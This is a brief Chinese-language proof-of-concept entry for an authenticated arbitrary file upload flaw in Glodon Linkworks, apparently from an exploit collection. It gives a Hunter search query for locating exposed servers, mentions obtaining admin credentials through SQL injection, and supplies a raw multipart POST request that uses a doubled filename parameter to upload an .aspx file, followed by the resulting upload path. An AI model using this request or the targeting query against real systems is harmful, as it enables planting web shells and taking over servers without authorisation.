# 广联达 Linkworks msgbroadcastuploadfile.aspx 后台文件上传漏洞

## 网络测绘

hunter: web.body="/Services/Identification/"

## POC / EXP

通过SQL注入获取管理员账号密码后登陆后台上传文件,验证POC

```
POST /gtp/im/services/group/msgbroadcastuploadfile.aspx HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
Cookie: 0_styleName=styleA

------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; filename="1.aspx";filename="1.jpg"
Content-Type: application/text

Test

------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```

```
/GTP/IM/Services/Group/Upload/xxx-xxx-test.aspx
```